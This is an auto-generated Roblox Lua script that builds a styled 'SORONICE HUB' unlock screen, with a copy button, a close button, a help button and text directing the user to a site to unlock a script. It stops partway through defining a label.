-- Gui to Lua V5
-- GUI : Mot de passe Stats

local Players   = game:GetService('Players')
local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild('PlayerGui')

local _old = PlayerGui:FindFirstChild([[Mot de passe Stats]])
if _old then _old:Destroy() end

-- _i : tableau indexe en continu, jamais de trous
-- => evite les nil et la limite 200 variables locales
local _i = {}

-- Instances:

_i[1] = Instance.new("ScreenGui")
_i[1].DisplayOrder = 0
_i[1].Enabled = true
_i[1].IgnoreGuiInset = false
_i[1].ResetOnSpawn = true
_i[1].Name = [[Mot de passe Stats]]
_i[1].Parent = PlayerGui

_i[2] = Instance.new("Frame")
_i[2].AnchorPoint = Vector2.new(0.5,0.5)
_i[2].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[2].BackgroundTransparency = 1
_i[2].BorderColor3 = Color3.fromRGB(0,0,0)
_i[2].BorderSizePixel = 0
_i[2].ClipsDescendants = false
_i[2].LayoutOrder = 0
_i[2].Position = UDim2.new(0.5,0,0.5,0)
_i[2].Rotation = 0
_i[2].Selectable = false
_i[2].Size = UDim2.new(1,0,1,0)
_i[2].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[2].Visible = true
_i[2].ZIndex = 1
_i[2].Name = [[Canvas]]
_i[2].Parent = _i[1]

_i[3] = Instance.new("UIAspectRatioConstraint")
_i[3].AspectRatio = 1.7794253826141357
_i[3].AspectType = Enum.AspectType.FitWithinMaxSize
_i[3].DominantAxis = Enum.DominantAxis.Width
_i[3].Name = [[UIAspectRatioConstraint]]
_i[3].Parent = _i[2]

_i[4] = Instance.new("Frame")
_i[4].AnchorPoint = Vector2.new(0.5,0.5)
_i[4].BackgroundColor3 = Color3.fromRGB(255,0,4)
_i[4].BackgroundTransparency = 1
_i[4].BorderColor3 = Color3.fromRGB(0,0,0)
_i[4].BorderSizePixel = 0
_i[4].ClipsDescendants = false
_i[4].LayoutOrder = 0
_i[4].Position = UDim2.new(0.5,0,0.5,0)
_i[4].Rotation = 0
_i[4].Selectable = false
_i[4].Size = UDim2.new(0.601042,0,0.643188,0)
_i[4].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[4].Visible = true
_i[4].ZIndex = 1
_i[4].Name = [[Container]]
_i[4].Parent = _i[2]

_i[5] = Instance.new("UIAspectRatioConstraint")
_i[5].AspectRatio = 1.6628241539001465
_i[5].AspectType = Enum.AspectType.FitWithinMaxSize
_i[5].DominantAxis = Enum.DominantAxis.Width
_i[5].Name = [[UIAspectRatioConstraint]]
_i[5].Parent = _i[4]

_i[6] = Instance.new("Frame")
_i[6].AnchorPoint = Vector2.new(0.5,0.5)
_i[6].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[6].BackgroundTransparency = 1
_i[6].BorderColor3 = Color3.fromRGB(0,0,0)
_i[6].BorderSizePixel = 0
_i[6].ClipsDescendants = false
_i[6].LayoutOrder = 0
_i[6].Position = UDim2.new(0.5,0,0.521614,0)
_i[6].Rotation = 0
_i[6].Selectable = false
_i[6].Size = UDim2.new(0.959272,0,0.936599,0)
_i[6].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[6].Visible = true
_i[6].ZIndex = 1
_i[6].Name = [[Main]]
_i[6].Parent = _i[4]

_i[7] = Instance.new("UIAspectRatioConstraint")
_i[7].AspectRatio = 1.703076958656311
_i[7].AspectType = Enum.AspectType.FitWithinMaxSize
_i[7].DominantAxis = Enum.DominantAxis.Width
_i[7].Name = [[UIAspectRatioConstraint]]
_i[7].Parent = _i[6]

_i[8] = Instance.new("ImageLabel")
_i[8].AnchorPoint = Vector2.new(0.5,0.5)
_i[8].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[8].BackgroundTransparency = 1
_i[8].BorderColor3 = Color3.fromRGB(0,0,0)
_i[8].BorderSizePixel = 0
_i[8].ClipsDescendants = false
_i[8].LayoutOrder = 0
_i[8].Position = UDim2.new(0.5,0,0.5,0)
_i[8].Rotation = 0
_i[8].Selectable = false
_i[8].Size = UDim2.new(0.999097,0,0.993846,0)
_i[8].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[8].Visible = true
_i[8].ZIndex = 1
_i[8].Image = [[rbxassetid://16303547683]]
_i[8].ImageColor3 = Color3.fromRGB(140,140,140)
_i[8].ImageRectOffset = Vector2.new(0,0)
_i[8].ImageRectSize = Vector2.new(0,0)
_i[8].ImageTransparency = 0
_i[8].ResampleMode = Enum.ResamplerMode.Default
_i[8].ScaleType = Enum.ScaleType.Stretch
_i[8].SliceCenter = Rect.new(0,0,0,0)
_i[8].SliceScale = 1
_i[8].Name = [[Background]]
_i[8].Parent = _i[6]

_i[9] = Instance.new("UIGradient")
_i[9].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(46,46,46)),ColorSequenceKeypoint.new(1,Color3.fromRGB(29,29,29))})
_i[9].Offset = Vector2.new(0,0)
_i[9].Rotation = -90
_i[9].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[9].Name = [[UIGradient]]
_i[9].Parent = _i[8]

_i[10] = Instance.new("UIAspectRatioConstraint")
_i[10].AspectRatio = 1.7120742797851562
_i[10].AspectType = Enum.AspectType.FitWithinMaxSize
_i[10].DominantAxis = Enum.DominantAxis.Width
_i[10].Name = [[UIAspectRatioConstraint]]
_i[10].Parent = _i[8]

_i[11] = Instance.new("ImageLabel")
_i[11].AnchorPoint = Vector2.new(0.5,0.5)
_i[11].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[11].BackgroundTransparency = 1
_i[11].BorderColor3 = Color3.fromRGB(0,0,0)
_i[11].BorderSizePixel = 0
_i[11].ClipsDescendants = false
_i[11].LayoutOrder = 0
_i[11].Position = UDim2.new(0.48915,0,0.712074,0)
_i[11].Rotation = 0
_i[11].Selectable = false
_i[11].Size = UDim2.new(0.979204,0,0.574303,0)
_i[11].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[11].Visible = true
_i[11].ZIndex = 1
_i[11].Image = [[rbxassetid://16303570034]]
_i[11].ImageColor3 = Color3.fromRGB(11,11,11)
_i[11].ImageRectOffset = Vector2.new(0,0)
_i[11].ImageRectSize = Vector2.new(0,0)
_i[11].ImageTransparency = 0
_i[11].ResampleMode = Enum.ResamplerMode.Default
_i[11].ScaleType = Enum.ScaleType.Stretch
_i[11].SliceCenter = Rect.new(0,0,0,0)
_i[11].SliceScale = 1
_i[11].Name = [[Texture]]
_i[11].Parent = _i[8]

_i[12] = Instance.new("UIAspectRatioConstraint")
_i[12].AspectRatio = 2.919137477874756
_i[12].AspectType = Enum.AspectType.FitWithinMaxSize
_i[12].DominantAxis = Enum.DominantAxis.Width
_i[12].Name = [[UIAspectRatioConstraint]]
_i[12].Parent = _i[11]

_i[13] = Instance.new("ImageLabel")
_i[13].AnchorPoint = Vector2.new(0.5,0.5)
_i[13].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[13].BackgroundTransparency = 1
_i[13].BorderColor3 = Color3.fromRGB(0,0,0)
_i[13].BorderSizePixel = 0
_i[13].ClipsDescendants = false
_i[13].LayoutOrder = 0
_i[13].Position = UDim2.new(0.485533,0,0.99226,0)
_i[13].Rotation = 0
_i[13].Selectable = false
_i[13].Size = UDim2.new(0.971067,0,0.0325077,0)
_i[13].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[13].Visible = true
_i[13].ZIndex = 1
_i[13].Image = [[rbxassetid://16303582510]]
_i[13].ImageColor3 = Color3.fromRGB(40,177,255)
_i[13].ImageRectOffset = Vector2.new(0,0)
_i[13].ImageRectSize = Vector2.new(0,0)
_i[13].ImageTransparency = 0
_i[13].ResampleMode = Enum.ResamplerMode.Default
_i[13].ScaleType = Enum.ScaleType.Stretch
_i[13].SliceCenter = Rect.new(0,0,0,0)
_i[13].SliceScale = 1
_i[13].Name = [[Accent]]
_i[13].Parent = _i[8]

_i[14] = Instance.new("UIAspectRatioConstraint")
_i[14].AspectRatio = 51.14285659790039
_i[14].AspectType = Enum.AspectType.FitWithinMaxSize
_i[14].DominantAxis = Enum.DominantAxis.Width
_i[14].Name = [[UIAspectRatioConstraint]]
_i[14].Parent = _i[13]

_i[15] = Instance.new("TextButton")
_i[15].AnchorPoint = Vector2.new(0.5,0.5)
_i[15].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[15].BackgroundTransparency = 1
_i[15].BorderColor3 = Color3.fromRGB(0,0,0)
_i[15].BorderSizePixel = 0
_i[15].ClipsDescendants = false
_i[15].LayoutOrder = 0
_i[15].Position = UDim2.new(0.986159,0,0.0172212,0)
_i[15].Rotation = 0
_i[15].Selectable = true
_i[15].Size = UDim2.new(0.0747572,0,0.133846,0)
_i[15].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[15].Visible = true
_i[15].ZIndex = 1
_i[15].AutoButtonColor = true
_i[15].Font = Enum.Font.SourceSans
_i[15].LineHeight = 1
_i[15].Modal = false
_i[15].RichText = false
_i[15].Selected = false
_i[15].Text = [[]]
_i[15].TextColor3 = Color3.fromRGB(0,0,0)
_i[15].TextScaled = false
_i[15].TextSize = 14
_i[15].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[15].TextStrokeTransparency = 1
_i[15].TextTransparency = 0
_i[15].TextWrapped = false
_i[15].TextXAlignment = Enum.TextXAlignment.Center
_i[15].TextYAlignment = Enum.TextYAlignment.Center
_i[15].Name = [[X]]
_i[15].Parent = _i[6]

_i[16] = Instance.new("ImageLabel")
_i[16].AnchorPoint = Vector2.new(0,0)
_i[16].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[16].BackgroundTransparency = 1
_i[16].BorderColor3 = Color3.fromRGB(0,0,0)
_i[16].BorderSizePixel = 0
_i[16].ClipsDescendants = false
_i[16].LayoutOrder = 0
_i[16].Position = UDim2.new(-0.139535,0,-0.149177,0)
_i[16].Rotation = 0
_i[16].Selectable = false
_i[16].Size = UDim2.new(1.25581,0,1.2548,0)
_i[16].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[16].Visible = true
_i[16].ZIndex = 1
_i[16].Image = [[rbxassetid://126371125566945]]
_i[16].ImageColor3 = Color3.fromRGB(255,255,255)
_i[16].ImageRectOffset = Vector2.new(0,0)
_i[16].ImageRectSize = Vector2.new(0,0)
_i[16].ImageTransparency = 0
_i[16].ResampleMode = Enum.ResamplerMode.Default
_i[16].ScaleType = Enum.ScaleType.Stretch
_i[16].SliceCenter = Rect.new(0,0,0,0)
_i[16].SliceScale = 1
_i[16].Name = [[ImageLabel]]
_i[16].Parent = _i[15]

_i[17] = Instance.new("TextButton")
_i[17].AnchorPoint = Vector2.new(0.5,0.5)
_i[17].BackgroundColor3 = Color3.fromRGB(0,4,221)
_i[17].BackgroundTransparency = 0
_i[17].BorderColor3 = Color3.fromRGB(0,0,0)
_i[17].BorderSizePixel = 0
_i[17].ClipsDescendants = false
_i[17].LayoutOrder = 0
_i[17].Position = UDim2.new(0.499442,0,0.815372,0)
_i[17].Rotation = 0
_i[17].Selectable = true
_i[17].Size = UDim2.new(0.340384,0,0.151697,0)
_i[17].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[17].Visible = true
_i[17].ZIndex = 1
_i[17].AutoButtonColor = true
_i[17].Font = Enum.Font.SourceSans
_i[17].LineHeight = 1
_i[17].Modal = false
_i[17].RichText = false
_i[17].Selected = false
_i[17].Text = [[]]
_i[17].TextColor3 = Color3.fromRGB(0,0,0)
_i[17].TextScaled = false
_i[17].TextSize = 14
_i[17].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[17].TextStrokeTransparency = 1
_i[17].TextTransparency = 0
_i[17].TextWrapped = false
_i[17].TextXAlignment = Enum.TextXAlignment.Center
_i[17].TextYAlignment = Enum.TextYAlignment.Center
_i[17].Name = [[Bouton Copier]]
_i[17].Parent = _i[6]

_i[18] = Instance.new("UICorner")
_i[18].CornerRadius = UDim.new(0,10)
_i[18].Name = [[UICorner]]
_i[18].Parent = _i[17]

_i[19] = Instance.new("UIStroke")
_i[19].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
_i[19].Color = Color3.fromRGB(255,255,255)
_i[19].LineJoinMode = Enum.LineJoinMode.Round
_i[19].Thickness = 4.099999904632568
_i[19].Transparency = 0.15000000596046448
_i[19].Name = [[UIStroke]]
_i[19].Parent = _i[17]

_i[20] = Instance.new("UIGradient")
_i[20].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(38,0,255)),ColorSequenceKeypoint.new(0.419301,Color3.fromRGB(134,245,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[20].Offset = Vector2.new(0,0)
_i[20].Rotation = -90
_i[20].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[20].Name = [[UIGradient]]
_i[20].Parent = _i[19]

_i[21] = Instance.new("UIGradient")
_i[21].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,1,70)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[21].Offset = Vector2.new(0,0)
_i[21].Rotation = -90
_i[21].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[21].Name = [[UIGradient]]
_i[21].Parent = _i[17]

_i[22] = Instance.new("TextLabel")
_i[22].AnchorPoint = Vector2.new(0,0)
_i[22].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[22].BackgroundTransparency = 1
_i[22].BorderColor3 = Color3.fromRGB(0,0,0)
_i[22].BorderSizePixel = 0
_i[22].ClipsDescendants = false
_i[22].LayoutOrder = 0
_i[22].Position = UDim2.new(0,0,-5.44957e-07,0)
_i[22].Rotation = 0
_i[22].Selectable = false
_i[22].Size = UDim2.new(1,0,0.984567,0)
_i[22].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[22].Visible = true
_i[22].ZIndex = 1
_i[22].Font = Enum.Font.SourceSans
_i[22].LineHeight = 1
_i[22].MaxVisibleGraphemes = -1
_i[22].RichText = false
_i[22].Text = [[COPYC]]
_i[22].TextColor3 = Color3.fromRGB(255,255,255)
_i[22].TextScaled = true
_i[22].TextSize = 100
_i[22].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[22].TextStrokeTransparency = 1
_i[22].TextTransparency = 0
_i[22].TextTruncate = Enum.TextTruncate.None
_i[22].TextWrapped = true
_i[22].TextXAlignment = Enum.TextXAlignment.Center
_i[22].TextYAlignment = Enum.TextYAlignment.Center
_i[22].Name = [[TextLabel]]
_i[22].Parent = _i[17]

_i[23] = Instance.new("UIStroke")
_i[23].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[23].Color = Color3.fromRGB(0,0,0)
_i[23].LineJoinMode = Enum.LineJoinMode.Round
_i[23].Thickness = 3.9000000953674316
_i[23].Transparency = 0
_i[23].Name = [[UIStroke]]
_i[23].Parent = _i[22]

_i[24] = Instance.new("ImageLabel")
_i[24].AnchorPoint = Vector2.new(0.5,0.5)
_i[24].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[24].BackgroundTransparency = 1
_i[24].BorderColor3 = Color3.fromRGB(0,0,0)
_i[24].BorderSizePixel = 0
_i[24].ClipsDescendants = false
_i[24].LayoutOrder = 0
_i[24].Position = UDim2.new(0.5,0,0.499613,0)
_i[24].Rotation = 0
_i[24].Selectable = false
_i[24].Size = UDim2.new(1,0,0.999226,0)
_i[24].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[24].Visible = true
_i[24].ZIndex = 1
_i[24].Image = [[rbxassetid://16303570034]]
_i[24].ImageColor3 = Color3.fromRGB(11,11,11)
_i[24].ImageRectOffset = Vector2.new(0,0)
_i[24].ImageRectSize = Vector2.new(0,0)
_i[24].ImageTransparency = 0
_i[24].ResampleMode = Enum.ResamplerMode.Default
_i[24].ScaleType = Enum.ScaleType.Stretch
_i[24].SliceCenter = Rect.new(0,0,0,0)
_i[24].SliceScale = 1
_i[24].Name = [[Texture]]
_i[24].Parent = _i[17]

_i[25] = Instance.new("UICorner")
_i[25].CornerRadius = UDim.new(0,10)
_i[25].Name = [[UICorner]]
_i[25].Parent = _i[24]

_i[26] = Instance.new("UIAspectRatioConstraint")
_i[26].AspectRatio = 3.824387550354004
_i[26].AspectType = Enum.AspectType.FitWithinMaxSize
_i[26].DominantAxis = Enum.DominantAxis.Width
_i[26].Name = [[UIAspectRatioConstraint]]
_i[26].Parent = _i[24]

_i[27] = Instance.new("ImageLabel")
_i[27].AnchorPoint = Vector2.new(0,0)
_i[27].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[27].BackgroundTransparency = 1
_i[27].BorderColor3 = Color3.fromRGB(0,0,0)
_i[27].BorderSizePixel = 0
_i[27].ClipsDescendants = false
_i[27].LayoutOrder = 0
_i[27].Position = UDim2.new(0.419913,0,0.235672,-7)
_i[27].Rotation = 0
_i[27].Selectable = false
_i[27].Size = UDim2.new(0.159058,0,0.270888,0)
_i[27].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[27].Visible = true
_i[27].ZIndex = 1
_i[27].Image = [[rbxassetid://123965417468651]]
_i[27].ImageColor3 = Color3.fromRGB(255,255,255)
_i[27].ImageRectOffset = Vector2.new(0,0)
_i[27].ImageRectSize = Vector2.new(0,0)
_i[27].ImageTransparency = 0
_i[27].ResampleMode = Enum.ResamplerMode.Default
_i[27].ScaleType = Enum.ScaleType.Stretch
_i[27].SliceCenter = Rect.new(0,0,0,0)
_i[27].SliceScale = 1
_i[27].Name = [[ImageLabel]]
_i[27].Parent = _i[6]

_i[28] = Instance.new("UIStroke")
_i[28].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[28].Color = Color3.fromRGB(0,0,0)
_i[28].LineJoinMode = Enum.LineJoinMode.Round
_i[28].Thickness = 5.599999904632568
_i[28].Transparency = 0.6000000238418579
_i[28].Name = [[UIStroke]]
_i[28].Parent = _i[27]

_i[29] = Instance.new("UICorner")
_i[29].CornerRadius = UDim.new(0,10000)
_i[29].Name = [[UICorner]]
_i[29].Parent = _i[27]

_i[30] = Instance.new("TextButton")
_i[30].AnchorPoint = Vector2.new(0.5,0.5)
_i[30].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[30].BackgroundTransparency = 1
_i[30].BorderColor3 = Color3.fromRGB(0,0,0)
_i[30].BorderSizePixel = 0
_i[30].ClipsDescendants = false
_i[30].LayoutOrder = 0
_i[30].Position = UDim2.new(0.235406,0,0.184572,0)
_i[30].Rotation = 0
_i[30].Selectable = true
_i[30].Size = UDim2.new(0.0445362,0,0.0704308,0)
_i[30].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[30].Visible = true
_i[30].ZIndex = 1
_i[30].AutoButtonColor = true
_i[30].Font = Enum.Font.SourceSans
_i[30].LineHeight = 1
_i[30].Modal = false
_i[30].RichText = false
_i[30].Selected = false
_i[30].Text = [[]]
_i[30].TextColor3 = Color3.fromRGB(0,0,0)
_i[30].TextScaled = false
_i[30].TextSize = 14
_i[30].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[30].TextStrokeTransparency = 1
_i[30].TextTransparency = 0
_i[30].TextWrapped = false
_i[30].TextXAlignment = Enum.TextXAlignment.Center
_i[30].TextYAlignment = Enum.TextYAlignment.Center
_i[30].Name = [[?]]
_i[30].Parent = _i[6]

_i[31] = Instance.new("ImageLabel")
_i[31].AnchorPoint = Vector2.new(0,0)
_i[31].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[31].BackgroundTransparency = 1
_i[31].BorderColor3 = Color3.fromRGB(0,0,0)
_i[31].BorderSizePixel = 0
_i[31].ClipsDescendants = false
_i[31].LayoutOrder = 0
_i[31].Position = UDim2.new(0,0,-0.0666667,0)
_i[31].Rotation = 0
_i[31].Selectable = false
_i[31].Size = UDim2.new(1,0,1.1,0)
_i[31].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[31].Visible = true
_i[31].ZIndex = 1
_i[31].Image = [[rbxassetid://131562149782285]]
_i[31].ImageColor3 = Color3.fromRGB(255,255,255)
_i[31].ImageRectOffset = Vector2.new(0,0)
_i[31].ImageRectSize = Vector2.new(0,0)
_i[31].ImageTransparency = 0
_i[31].ResampleMode = Enum.ResamplerMode.Default
_i[31].ScaleType = Enum.ScaleType.Crop
_i[31].SliceCenter = Rect.new(0,0,0,0)
_i[31].SliceScale = 1
_i[31].Name = [[ImageLabel]]
_i[31].Parent = _i[30]

_i[32] = Instance.new("UICorner")
_i[32].CornerRadius = UDim.new(0,20)
_i[32].Name = [[UICorner]]
_i[32].Parent = _i[31]

_i[33] = Instance.new("UIStroke")
_i[33].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[33].Color = Color3.fromRGB(255,255,255)
_i[33].LineJoinMode = Enum.LineJoinMode.Round
_i[33].Thickness = 1.7000000476837158
_i[33].Transparency = 0
_i[33].Name = [[UIStroke]]
_i[33].Parent = _i[31]

_i[34] = Instance.new("TextLabel")
_i[34].AnchorPoint = Vector2.new(0,0)
_i[34].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[34].BackgroundTransparency = 1
_i[34].BorderColor3 = Color3.fromRGB(0,0,0)
_i[34].BorderSizePixel = 0
_i[34].ClipsDescendants = false
_i[34].LayoutOrder = 0
_i[34].Position = UDim2.new(0.232224,0,0.501143,0)
_i[34].Rotation = 0
_i[34].Selectable = false
_i[34].Size = UDim2.new(0.574199,0,0.19233,0)
_i[34].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[34].Visible = true
_i[34].ZIndex = 1
_i[34].Font = Enum.Font.SourceSans
_i[34].LineHeight = 1
_i[34].MaxVisibleGraphemes = -1
_i[34].RichText = false
_i[34].Text = [[Press this button to proceed to the site and complete the unlocking process to access the script.]]
_i[34].TextColor3 = Color3.fromRGB(255,255,255)
_i[34].TextScaled = true
_i[34].TextSize = 14
_i[34].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[34].TextStrokeTransparency = 1
_i[34].TextTransparency = 0
_i[34].TextTruncate = Enum.TextTruncate.None
_i[34].TextWrapped = true
_i[34].TextXAlignment = Enum.TextXAlignment.Left
_i[34].TextYAlignment = Enum.TextYAlignment.Top
_i[34].Name = [[TextLabel]]
_i[34].Parent = _i[6]

_i[35] = Instance.new("UIStroke")
_i[35].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[35].Color = Color3.fromRGB(0,0,0)
_i[35].LineJoinMode = Enum.LineJoinMode.Round
_i[35].Thickness = 3.9000000953674316
_i[35].Transparency = 0
_i[35].Name = [[UIStroke]]
_i[35].Parent = _i[34]

_i[36] = Instance.new("Frame")
_i[36].AnchorPoint = Vector2.new(0.5,0.5)
_i[36].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[36].BackgroundTransparency = 1
_i[36].BorderColor3 = Color3.fromRGB(0,0,0)
_i[36].BorderSizePixel = 0
_i[36].ClipsDescendants = false
_i[36].LayoutOrder = 0
_i[36].Position = UDim2.new(0.39688,0,0.0864553,0)
_i[36].Rotation = 0
_i[36].Selectable = false
_i[36].Size = UDim2.new(0.794627,0,0.172911,0)
_i[36].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[36].Visible = true
_i[36].ZIndex = 1
_i[36].Name = [[Title]]
_i[36].Parent = _i[4]

_i[37] = Instance.new("UIAspectRatioConstraint")
_i[37].AspectRatio = 7.641666889190674
_i[37].AspectType = Enum.AspectType.FitWithinMaxSize
_i[37].DominantAxis = Enum.DominantAxis.Width
_i[37].Name = [[UIAspectRatioConstraint]]
_i[37].Parent = _i[36]

_i[38] = Instance.new("ImageLabel")
_i[38].AnchorPoint = Vector2.new(0.5,0.5)
_i[38].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[38].BackgroundTransparency = 1
_i[38].BorderColor3 = Color3.fromRGB(0,0,0)
_i[38].BorderSizePixel = 0
_i[38].ClipsDescendants = false
_i[38].LayoutOrder = 0
_i[38].Position = UDim2.new(0.5,0,0.5,0)
_i[38].Rotation = 0
_i[38].Selectable = false
_i[38].Size = UDim2.new(1,0,1,0)
_i[38].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[38].Visible = true
_i[38].ZIndex = 1
_i[38].Image = [[rbxassetid://16303779706]]
_i[38].ImageColor3 = Color3.fromRGB(255,255,255)
_i[38].ImageRectOffset = Vector2.new(0,0)
_i[38].ImageRectSize = Vector2.new(0,0)
_i[38].ImageTransparency = 0
_i[38].ResampleMode = Enum.ResamplerMode.Default
_i[38].ScaleType = Enum.ScaleType.Stretch
_i[38].SliceCenter = Rect.new(0,0,0,0)
_i[38].SliceScale = 1
_i[38].Name = [[Main]]
_i[38].Parent = _i[36]

_i[39] = Instance.new("UIAspectRatioConstraint")
_i[39].AspectRatio = 7.641666889190674
_i[39].AspectType = Enum.AspectType.FitWithinMaxSize
_i[39].DominantAxis = Enum.DominantAxis.Width
_i[39].Name = [[UIAspectRatioConstraint]]
_i[39].Parent = _i[38]

_i[40] = Instance.new("ImageLabel")
_i[40].AnchorPoint = Vector2.new(0.5,0.5)
_i[40].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[40].BackgroundTransparency = 1
_i[40].BorderColor3 = Color3.fromRGB(0,0,0)
_i[40].BorderSizePixel = 0
_i[40].ClipsDescendants = false
_i[40].LayoutOrder = 0
_i[40].Position = UDim2.new(0.5,0,0.5,0)
_i[40].Rotation = 0
_i[40].Selectable = false
_i[40].Size = UDim2.new(0.969466,0,0.725,0)
_i[40].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[40].Visible = true
_i[40].ZIndex = 1
_i[40].Image = [[rbxassetid://16303784238]]
_i[40].ImageColor3 = Color3.fromRGB(3,154,255)
_i[40].ImageRectOffset = Vector2.new(0,0)
_i[40].ImageRectSize = Vector2.new(0,0)
_i[40].ImageTransparency = 0
_i[40].ResampleMode = Enum.ResamplerMode.Default
_i[40].ScaleType = Enum.ScaleType.Stretch
_i[40].SliceCenter = Rect.new(0,0,0,0)
_i[40].SliceScale = 1
_i[40].Name = [[Color]]
_i[40].Parent = _i[38]

_i[41] = Instance.new("UIAspectRatioConstraint")
_i[41].AspectRatio = 10.218390464782715
_i[41].AspectType = Enum.AspectType.FitWithinMaxSize
_i[41].DominantAxis = Enum.DominantAxis.Width
_i[41].Name = [[UIAspectRatioConstraint]]
_i[41].Parent = _i[40]

_i[42] = Instance.new("TextLabel")
_i[42].AnchorPoint = Vector2.new(0,0)
_i[42].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[42].BackgroundTransparency = 1
_i[42].BorderColor3 = Color3.fromRGB(0,0,0)
_i[42].BorderSizePixel = 0
_i[42].ClipsDescendants = false
_i[42].LayoutOrder = 0
_i[42].Position = UDim2.new(0.838457,0,0,0)
_i[42].Rotation = 0
_i[42].Selectable = false
_i[42].Size = UDim2.new(0.146566,0,0.789311,0)
_i[42].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[42].Visible = true
_i[42].ZIndex = 40
_i[42].Font = Enum.Font.SourceSansBold
_i[42].LineHeight = 1
_i[42].MaxVisibleGraphemes = -1
_i[42].RichText = false
_i[42].Text = [[v4]]
_i[42].TextColor3 = Color3.fromRGB(255,255,255)
_i[42].TextScaled = true
_i[42].TextSize = 14
_i[42].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[42].TextStrokeTransparency = 1
_i[42].TextTransparency = 0
_i[42].TextTruncate = Enum.TextTruncate.None
_i[42].TextWrapped = true
_i[42].TextXAlignment = Enum.TextXAlignment.Center
_i[42].TextYAlignment = Enum.TextYAlignment.Center
_i[42].Name = [[TextLabel]]
_i[42].Parent = _i[40]

_i[43] = Instance.new("UIStroke")
_i[43].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[43].Color = Color3.fromRGB(255,255,255)
_i[43].LineJoinMode = Enum.LineJoinMode.Round
_i[43].Thickness = 2.5999999046325684
_i[43].Transparency = 0
_i[43].Name = [[UIStroke]]
_i[43].Parent = _i[42]

_i[44] = Instance.new("UIGradient")
_i[44].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,251,255)),ColorSequenceKeypoint.new(0.50416,Color3.fromRGB(0,0,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(191,0,255))})
_i[44].Offset = Vector2.new(0,0)
_i[44].Rotation = 0
_i[44].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[44].Name = [[UIGradient]]
_i[44].Parent = _i[43]

_i[45] = Instance.new("TextLabel")
_i[45].AnchorPoint = Vector2.new(0.5,0.5)
_i[45].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[45].BackgroundTransparency = 1
_i[45].BorderColor3 = Color3.fromRGB(0,0,0)
_i[45].BorderSizePixel = 0
_i[45].ClipsDescendants = false
_i[45].LayoutOrder = 0
_i[45].Position = UDim2.new(0.346311,0,0.512949,0)
_i[45].Rotation = 0
_i[45].Selectable = false
_i[45].Size = UDim2.new(0.58485,0,0.604167,0)
_i[45].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[45].Visible = true
_i[45].ZIndex = 1
_i[45].Font = Enum.Font.FredokaOne
_i[45].LineHeight = 1
_i[45].MaxVisibleGraphemes = -1
_i[45].RichText = false
_i[45].Text = [[SORONICE  HUB]]
_i[45].TextColor3 = Color3.fromRGB(255,255,255)
_i[45].TextScaled = true
_i[45].TextSize = 14
_i[45].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[45].TextStrokeTransparency = 1
_i[45].TextTransparency = 0
_i[45].TextTruncate = Enum.TextTruncate.None
